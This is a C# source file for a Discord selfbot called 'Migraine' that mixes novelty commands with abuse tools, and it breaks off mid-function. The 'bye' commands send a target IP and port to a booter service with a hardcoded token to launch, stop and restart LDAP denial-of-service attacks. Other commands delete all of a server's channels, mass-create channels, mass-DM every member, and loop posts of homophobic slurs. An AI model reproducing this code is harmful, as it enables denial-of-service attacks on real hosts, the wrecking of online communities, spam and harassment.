using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Figgle;
using Migraine_v2.API;
using Migraine_v2.LoginClass;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using Migraine_v2.CustomSettings;

namespace Migraine_v2.SelfbotClasses {
    public class Commands : ModuleBase
    {

        [Command("dchan")]
        public async Task dchannel()
        {
            await Context.Message.DeleteAsync();
            IReadOnlyCollection<IGuildChannel> get = await Context.Guild.GetChannelsAsync(CacheMode.AllowDownload, null);
            foreach (var channel in get)
                await channel.DeleteAsync();
        }
        [Command("ccmds")]
        public async Task CustomCmds()
        {
            await Context.Message.DeleteAsync();

            EmbedBuilder build = new EmbedBuilder();
            build.WithTitle("Custom Commands");
            build.WithDescription("Here's a list of all your custom, user defined, commands");
            build.WithColor(Color.Orange);

            if (Configuration._Config.CustomCommands.Count > 0)
            {
                foreach (var key in Configuration._Config.CustomCommands.Keys)
                {
                    if (Configuration._Config.CustomCommands.TryGetValue(key, out string value))
                    {
                        build.WithFields().AddField(key, value, true);
                    }
                }
            }
            else
            {
                build.WithDescription($"You have no custom commands! You can use the command {Globals.Prefix}ccmd <cmdname> <response> to create one however.");
            }

            await ReplyAsync("", false, build.Build());
        }

        [Command("ccmd")]
        public async Task CreateCustomCommand(string name, [Remainder] string response)
        {
            await Context.Message.DeleteAsync();

            EmbedBuilder build = new EmbedBuilder();
            build.WithTitle("Custom Commands");
            build.WithDescription("Successfully created your custom command.");
            build.WithColor(Color.Green);
            build.WithAuthor($"I've successfully added your custom command of {name}", "https://i.dlpng.com/static/png/6705921_preview.png");
            Configuration._Config.CustomCommands.Add(Globals.Prefix + name.ToLower(), response);
            Configuration.SaveConfig();

            await ReplyAsync("", false, build.Build());
        }

        [Command("loopinsult")]
        public async Task LoopInsult()
        {
            await Context.Message.DeleteAsync();
            var msg = new Random();
            var insults = new string[] {
                "ur a fag",
                "get a life u shitbag",
                "ur mom has balls bigger than you",
                "keep sucking dick faggot",
                "ur a pussy",
                "keep talking fag",
                "i bench ur mom tits in my mouth",
                "ok boomer",
                "u can't talk for shit, did u run out of jokes?",
                "go back to sucking your moms left tit",
                "are you gonna cry now? awwwwww",
                "bitch please, you built like a soggy noodle"
            };
            foreach (var message in insults)
            {
                await Context.Channel.SendMessageAsync($"{insults[msg.Next(0, insults.Length)]}");
                Thread.Sleep(15000);
            }
        }

        [Command("8ball")]
        public async Task ball(string message = null)
        {
            await Context.Message.DeleteAsync();
            var answers = new string[] {
                "It is certain",
                "It is decidedly so",
                "Without a doubt",
                "Yes, definitely",
                "You may rely on it",
                "As I see it, yes",
                "Most likely",
                "Outlook good",
                "Yes",
                "Signs point to yes",
                "Reply hazy try again",
                "Ask again later",
                "Better not tell you now",
                "Cannot predict now",
                "Concentrate and ask again",
                "Don't count on it",
                "My reply is no",
                "My sources say no",
                "Outlook not so good",
                "Very doubtful"
            };

            if (string.IsNullOrWhiteSpace(message))
                return;
            Random rng = new Random();
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithTitle($"Question: **{message}**");
            embed.WithDescription("Answer: `" + answers[rng.Next(0, answers.Length)] + "`");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("in #" + Context.Channel.Name + " - Today at " + DateTime.Now.ToShortTimeString(), null);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("911")]
        public async Task nine11()
        {
            await Context.Message.DeleteAsync();
            var Message = await Context.Channel.SendMessageAsync(":firecracker::airplane:       :office:");
            Thread.Sleep(1000);
            await Context.Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane:     :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane:   :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane: :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
                {
                    msg.Content = ":firecracker::airplane::office:";
                }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":fire::fire::fire:";
            }, null);
            Thread.Sleep(1000);
            await Context.Message.DeleteAsync();
        }

        [Command("anime")]
        public async Task anime()
        {
            await Context.Message.DeleteAsync();

            var client = new WebClient();
            string json = client.DownloadString("https://api.computerfreaker.cf/v1/anime");
            var result = JsonConvert.DeserializeObject<API.RandomHentai.RootObject>(json);

            var embed = new EmbedBuilder();
            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("annoy")]
        public async Task annoy(string args)
        {
            await Context.Message.DeleteAsync();

            foreach (var message in args)
            {
                Thread.Sleep(16000);
                await Context.Channel.SendMessageAsync(args);
            }
            await Context.Channel.SendMessageAsync(args);

        }

        [Command("ascii")]
        public async Task ascii(string args)
        {
            await Context.Message.DeleteAsync();

            await Context.Channel.SendMessageAsync("```" + FiggleFonts.Standard.Render(args) + "```");
        }

        [Command("av")]
        public async Task av(SocketUser user = null)
        {
            if (user == null)
                user = Context.Message.Author as SocketUser;

            List<string> RolesString = new List<string>();
            foreach (var role in Context.Guild.Roles)
                RolesString.Add(role.Mention);

            var embed = new EmbedBuilder();
            await Context.Message.DeleteAsync();
            embed.WithAuthor($"{user}'s Avatar");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithImageUrl(user.GetAvatarUrl(0, 1024));
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("ban")]
        public async Task ban(SocketUser userName = null, string reason = null)
        {
            SocketUser user = Context.User as SocketUser;
            bool flag = userName == null;
            if (flag)
                await Context.Channel.SendMessageAsync("Specify someone to ban.", false, null);
            else if (userName == user)
                await Context.Channel.SendMessageAsync("I'm not banning myself, try someone else.", false);
            try
            {
                await Context.Guild.AddBanAsync(userName, 5, reason);
                await Context.Channel.SendMessageAsync((reason == null) ? ("I Banned " + userName.Username) : ("I Banned " + userName.Username + " Because: " + reason), false, null);
                ConsoleLog.Log("Banned User " + userName.Username + " from " + Context.Guild.Name);
            }
            catch (Exception)
            {
                await Context.Channel.SendMessageAsync("Uhm, Just Kidding...", false, null);
            }
        }


        [Command("price btc")]
        public async Task pricebtc()
        {
            await Context.Message.DeleteAsync();

            var args = new WebClient();
            {
                string price = args.DownloadString("https://bitpay.com/api/rates/usd");
                dynamic json = JsonConvert.DeserializeObject(price);
                var embed = new EmbedBuilder();

                embed.WithThumbnailUrl("https://bitcoin.org/img/icons/opengraph.png");
                embed.WithTitle("Bitcoin Price");
                embed.WithDescription("Displays bitcoin price");
                embed.WithColor(new Color(242, 169, 0));
                embed.AddField("Bitcoin Price:", double.Parse(Convert.ToString(json.rate)).ToString("C"));

                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
        }
        [Command("bold")]
        public async Task bold(string args)
        {
            await Context.Message.DeleteAsync(null);

            await Context.Channel.SendMessageAsync("**" + args + "**");
        }

        [Command("bomb")]
        public async Task bomb()
        {
            await Context.Message.DeleteAsync(null);
            var Message = await Context.Channel.SendMessageAsync(":bomb:------:fire:");
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:-----:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:----:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:---:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:--:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:-:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":boom:";
            }, null);
            Thread.Sleep(1000);
            await Context.Message.DeleteAsync();
        }

        public string bitcoin;

        [Command("pay btc")]
        public async Task btc()
        {
            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();
            Settings.getSettings();
            string bitcoin = Settings._Bitcoin;
            embed.WithAuthor("Bitcoin Address");
            embed.WithThumbnailUrl("https://cdn.discordapp.com/attachments/648668483814686732/652833384372109313/5b28dbe766917.png");
            embed.WithDescription("``" + bitcoin + "``");
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        public static JObject json;

        public static string getDefaults()
        {
            List<string> str = new List<string>();
            str.Add("{");
            str.Add("\"userInfo\":{");
            str.Add("\"bitcoin\":\"\"");
            str.Add("}");
            str.Add("}");
            return string.Join("\n", str.ToArray());
        }

        [Command("bye")]
        public async Task bye(string ip, string port, string time)
        {
            //f (ip = null)
            await Context.Message.DeleteAsync();
            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["token"] = "pDCNT0zYIjpHsR",
                    ["target"] = ip,
                    ["port"] = port,
                    ["duration"] = time.ToString(),
                    ["method"] = "LDAP",
                    ["pps"] = "500000"
                    //["test_id"] = test_id
                };
                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/launch"), new FormUrlEncodedContent(PostData));
            }

            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor("Attack sent successfully. | Migraine Booter");
            //embed.AddField("**ID:**", $"{test_id}");
            embed.AddField("**Target:**", $"{ip}");
            embed.AddField("**Port:**", $"{port}");
            embed.AddField("**Time:**", $"{time}");
            embed.AddField("**Method:**", "LDAP");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("bye stop")]
        public async Task byestop(string test_id)
        {
            await Context.Message.DeleteAsync();
            if (CheckFiddler._())
                return;
            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["token"] = "pDCNT0zYIjpHsR",
                    ["target"] = test_id
                };
                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/stop"), new FormUrlEncodedContent(PostData));
            }

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithAuthor("Attack successfully stopped. | Migraine Booter");
            embed.AddField("**ID:**", $"{test_id}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("bye restart")]
        public async Task byerestart(string test_id)
        {
            await Context.Message.DeleteAsync();
            if (CheckFiddler._())
                return;
            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["token"] = "pDCNT0zYIjpHsR",
                    ["target"] = test_id
                };
                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/restart"), new FormUrlEncodedContent(PostData));
            }

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithAuthor("Attack sucessfully restarted. | Migraine Booter");
            embed.AddField("**ID:**", $"{test_id}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }

        [Command("cat")]
        public async Task cat()
        {
            WebClient client = new WebClient();
            string json = client.DownloadString("http://aws.random.cat/meow");
            var result = JsonConvert.DeserializeObject<API.RandomDogImage.RootObject>(json);

            var embed = new EmbedBuilder();
            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("clearc")]
        public async Task clearc()
        {
            await Context.Message.DeleteAsync();

            await Context.Channel.SendMessageAsync("_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n");
        }

        [Command("cchan")]
        [RequireUserPermission(GuildPermission.Administrator)]
        public async Task cchannel(string channelname)
        {
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);
            await Context.Guild.CreateTextChannelAsync(channelname);

            var create = Context.Guild.CreateTextChannelAsync(channelname);

        }

        [Command("developer")]
        public async Task dev()
        {
            await Context.Message.DeleteAsync();
            var embed = new EmbedBuilder();
            embed.WithAuthor("");
            embed.WithTitle("Migraine [Discord Multi-Tool]");
            embed.WithUrl(Globals.DiscordURL);
            embed.WithDescription($"Migraine is developed by [Twin Turbo]\nTo purchase this tool go to https://migraine.best/");
            embed.WithThumbnailUrl(Globals.MigraineImageURL);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine Coded By: Twin Turbo");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("dog")]
        public async Task dog()
        {
            await Context.Message.DeleteAsync();

            WebClient client = new WebClient();
            string json = client.DownloadString("https://random.dog/woof.json");
            var result = JsonConvert.DeserializeObject<RandomDogImage.RootObject>(json);

            var embed = new EmbedBuilder();
            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("donate")]
        public async Task donate()
        {
            var embed = new EmbedBuilder();
            await Context.Message.DeleteAsync();
            embed.WithAuthor("Support the Developer");
            embed.WithDescription(string.Concat("Bitcoin: ``162b3aK1SJ6zCdLJ1gTuehUjNiUYJBHdbG``"));
            embed.WithColor(new Color(255, 153, 0));
            embed.WithFooter("Made by Twin Turbo | Migraine");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("eascii")]

        public async Task eascii(string args)
        {
            await Context.Message.DeleteAsync();

            await Context.Channel.SendMessageAsync("```" + FiggleFonts.Standard.Render(args) + "```");
        }

        [Command("embed")]
        public async Task embed(string message = null)
        {
            await Context.Message.DeleteAsync(null);
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor("");
            embed.WithDescription(message);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("in #" + Context.Channel.Name + " - Today at " + DateTime.Now.ToShortTimeString(), null);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("coinflip")]
        public async Task coinflip()
        {
            await Context.Message.DeleteAsync(null);

            Random headsortails = new Random();
            var embed = new EmbedBuilder();

            var result = headsortails.Next(0, 2) == 0 ? "Heads" : "Tails";
            embed.WithDescription(result.ToString());
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("gay")]
        public async Task gay(SocketGuildUser user = null)
        {
            if (user == null)
                user = Context.Message.Author as SocketGuildUser;

            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();
            Random random = new Random();

            int randomNumber = random.Next(0, 100);
            embed.WithAuthor("");
            embed.WithTitle("Gay Calculator");
            embed.WithDescription("See's how gay the person is");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithDescription($"**{user}**, You are {randomNumber}% gay.");
            embed.WithFooter("Migraine | Made by Twin Turbo");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("gp")]
        public async Task gp(SocketUser user = null) => await Context.Message.DeleteAsync();

        [Command("hack")]
        public async Task hack(SocketGuildUser user = null)
        {
            await Context.Message.DeleteAsync();

            var Message = await Context.Channel.SendMessageAsync($"*Hacking {user}...*");
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = string.Format("*Getting {0}'s IP Address...*", user);
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*IP: 192.168.1.1*";
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = string.Format("*Getting {0}'s Address...*", user);
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*Address: 123 Elf dr*";
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*Grabbing all Info...*";
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*Sent to FBI*";
            }, null);

            await Context.Message.DeleteAsync();
        }

        [Command("help")]
        public async Task help()
        {
            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();

            embed.WithTitle("Migraine Selfbot Commands");
            embed.WithDescription("**View all the Commands you can execute below!**");
            embed.AddField("stats", "View selfbot statistics");
            embed.AddField("ping", "Check client's latency");
            embed.AddField("spam", "Spams Channel (spam <message> <amount>)");
            embed.AddField("embed", "Embeds your message");
            embed.AddField("poll", "Creates a Poll");
            embed.AddField("quote", "Quote a Message (quote <messageid>)");
            embed.AddField("cquote", "Copy quote from a different channel (cquote <messageid>)");
            embed.AddField("ban", "Ban a user");
            embed.AddField("kick", "Kick a user");
            embed.AddField("userinfo", "Get information on a user");
            embed.AddField("purge", "Deletes messages (purge <amount>)");
            embed.AddField("massdm", "Dm all Members (Risky On Main Account)");
            embed.AddField("gp", "Makes the person your pinging clueless");
            embed.AddField("clearc", "Clears chat with invisible characters");
            embed.AddField("ascii", "Changes your text to ascii format <message>");
            embed.AddField("bomb", "Bombs chat");
            embed.AddField("gay", "Gay Calculator <user>");
            embed.AddField("spfp", "Returns Server picture");
            embed.AddField("sstats", "Returns Server statistics");
            embed.WithFooter("If you want to see more of Migraine's commands, look inside the program.");
            embed.WithColor(Globals.EmbedHexColor);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("hentai")]

        public async Task hental()
        {
            await Context.Message.DeleteAsync();

            WebClient client = new WebClient();
            var embed = new EmbedBuilder();

            string json = client.DownloadString("https://nekos.life/");
            var result = JsonConvert.DeserializeObject<RandomHentai.RootObject>(json);

            embed.WithImageUrl(result.image.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("hug")]

        public async Task hug()
        {
            await Context.Message.DeleteAsync();

            WebClient client = new WebClient();
            var embed = new EmbedBuilder();

            string json = client.DownloadString("https://api.computerfreaker.cf/v1/hug");
            var result = JsonConvert.DeserializeObject<API.RandomHug.RootObject>(json);

            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("invis")]
        public async Task invis()
        {
            await Context.Message.DeleteAsync();

            string link = "https://cdn.discordapp.com/attachments/655112251849572375/655162016868335617/invis.png";

            var s = Context.Message.DeleteAsync();

            try
            {
                var webClient = new WebClient();
                byte[] imageBytes = webClient.DownloadData(link);

                var stream = new MemoryStream(imageBytes);

            }
            catch (Exception)
            {
                var embed = new EmbedBuilder();
                embed.WithDescription("Could not set the avatar!");
                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
        }

        [Command("ip")]

        public async Task ip(string ip)
        {
            await Context.Message.DeleteAsync();
            WebClient client = new WebClient();

            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["ip"] = ip
                };
                var response = await req.PostAsync(new Uri($"https://ipapi.co/{ip}/json/"), new FormUrlEncodedContent(PostData));
                string json = client.DownloadString($"https://ipapi.co/{ip}/json/");
                var result = JsonConvert.DeserializeObject<API.RandomDogImage.RootObject>(json);
            }

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithAuthor("IP Result. | Migraine");
            embed.AddField("**IP:**", $"{ip}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("kick")]
        [RequireUserPermission(GuildPermission.KickMembers)]
        public async Task kick(SocketGuildUser userName = null, [Remainder] string reason = null)
        {
            SocketGuildUser user = base.Context.User as SocketGuildUser;
            bool flag = userName == null;
            if (!flag)
            {
                bool flag2 = userName == user;
                if (!flag2)
                {
                    int targetHighest = userName.Hierarchy;
                    int senderHighest = user.Hierarchy;
                    bool flag3 = targetHighest < senderHighest;
                    if (flag3)
                    {
                        try
                        {
                            await userName.KickAsync(null, null);
                            IUserMessage userMessage = await this.ReplyAsync((reason == null) ? ("I Have Kicked " + userName.Username) : ("I Have Kicked " + userName.Username + " Because: " + reason), false, null, null);
                            ConsoleLog.Log("Kicked User " + userName.Username + " from " + user.Guild.Name);
                        }
                        catch
                        {
                        }
                    }
                    else
                    {
                        await this.ReplyAsync("Uhm, Just Kidding...", false, null, null);
                    }
                }
            }
        }

        [Command("lenny")]
        public async Task lenny() { await Context.Message.DeleteAsync(); await Context.Channel.SendMessageAsync("( ͡° ͜ʖ ͡°)"); }

        [Command("massdm")]
        public async Task massdm(string message = null)
        {
            await base.Context.Message.DeleteAsync(null);
            if (message == null)
            {
                await this.ReplyAsync("Need message to send", false, null, null);
            }
            else
            {
                ConsoleLog.Log("Started Mass Dming");
                new Thread(delegate ()
                {
                    this.DmSpam(message);
                }).Start();
            }
        }
        public async Task DmSpam(string message)
        {
            IReadOnlyCollection<IGuildUser> readOnlyCollection = await base.Context.Guild.GetUsersAsync(CacheMode.AllowDownload, null);
            IReadOnlyCollection<IGuildUser> users = readOnlyCollection;
            readOnlyCollection = null;
            foreach (IGuildUser user in users)
            {
                int num = 0;
                try
                {
                    IDMChannel idmchannel = await user.GetOrCreateDMChannelAsync(null);
                    IDMChannel channel = idmchannel;
                    idmchannel = null;
                    await channel.SendMessageAsync(message, false, null, null);
                    await Task.Delay(100);
                    channel = null;
                }
                catch
                {
                    num = 1;
                }
                if (num == 1)
                {
                    await Task.Delay(1000);
                }
            }
            ConsoleLog.Log("Finished Mass Dming");
        }

        [Command("migraine")]

        public async Task migraine()
        {

            await Context.Message.DeleteAsync();

            var Message = await Context.Channel.SendMessageAsync("M");

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MI";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIG";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGR";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRA";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAI";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAIN";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE |";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE ";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE |";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE ";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE |";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE ";
            }, null);
            Thread.Sleep(1000);

            await Context.Message.DeleteAsync();
        }

        [Command("ping")]
        public async Task ping()
        {
            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();
            embed.WithTitle("Ping Tester");
            embed.WithDescription(string.Concat("**Socket Latency**: ", StartBot._Client.Latency.ToString("#,##0"), "ms"));
            embed.WithFooter("Migraine");
